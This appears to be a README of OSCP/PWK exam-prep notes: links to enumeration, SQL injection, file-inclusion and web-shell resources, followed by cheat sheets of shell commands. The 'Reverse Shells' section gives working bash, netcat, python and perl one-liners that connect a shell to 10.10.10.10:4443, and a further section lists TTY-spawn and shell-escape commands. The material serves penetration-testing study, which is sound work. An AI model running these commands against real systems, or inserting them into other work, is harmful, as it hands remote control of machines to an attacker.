# OSCP / PWK Repo

During my time at the PWK labs and for my OSCP preparation, I gathered a big amount of useful stuff that I want to share and make available to the community. With a huge amount of respect to the Offensive Security team, I will not disclose anything about the labs and the exam, but I will give general information and study lines for the young padawans out there who want to TRY HARDER!!!

**Note:** There is high probability that you will get nothing new from this repo. These are just my notes and sources, and you can find everything online but they are gathered in a way that suited me by the time of my exam. :)

## General Links

- Exploit interpreter fix: https://askubuntu.com/questions/304999/not-able-to-execute-a-sh-file-bin-bashm-bad-interpreter
- Oscp repo: https://github.com/rewardone/OSCPRepo
- Pentest compilation: https://github.com/adon90/pentest_compilation
- Command Templates: https://pentest.ws
- Password Lists: https://github.com/danielmiessler/SecLists
- Automated OSCP reconnaissance tool: https://github.com/codingo/Reconnoitre
- OSCP Report Template: https://github.com/whoisflynn/OSCP-Exam-Report-Template
- OSCP Scripts: https://github.com/ihack4falafel/OSCP
- Pentesting resource: https://guif.re/
- FTP Binary mode: https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files
- Pentesting Cheatsheet: https://ired.team/

## Enumeration

- General Enumeration - Common port checks: http://www.0daysecurity.com/penetration-testing/enumeration.html
- Nmap Scripts: https://nmap.org/nsedoc/

## Web

- LFI/RFI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-rfi
- MSSQL Injection: https://www.exploit-db.com/papers/12975
    - MSSQL Union Based Injection: http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html
    - MSSQL SQL Injection Cheat Sheet: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- MySQL Injection: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- MongoDB Nosql Injection: https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code
    - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

## Shell Exploitation

- Reverse Shell Cheat Sheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
    - More Reverse Shells: https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
    - Even More Reverse shells: https://delta.navisec.io/reverse-shell-reference/
- Spawning TTY Shell: https://netsec.ws/?p=337
- Metasploit payloads (msfvenom): https://netsec.ws/?p=331
- Best Web Shells: https://www.1337pwn.com/best-php-web-shells/
    - https://github.com/artyuum/Simple-PHP-Web-Shell
    - http://www.topshellv.com/
- Escape from SHELLcatraz: https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=10

### Reverse Shells

- bash -i >& /dev/tcp/10.10.10.10/4443 0>&1
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
- nc -e /bin/sh 10.10.10.10 4443
- nc -e cmd.exe 10.10.10.10 4443
- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
- perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

### Spawn TTY Shells

- python -c 'import pty; pty.spawn("/bin/sh")'
- echo os.system('/bin/bash')
- /bin/sh -i
- perl —e 'exec "/bin/sh";'
- perl: exec "/bin/sh";
- ruby: exec "/bin/sh"
- lua: os.execute('/bin/sh')
- (From within IRB): exec "/bin/sh"
- (From within vi): :!bash
- (From within vi): :set shell=/bin/bash:shell
- (From within nmap): !sh

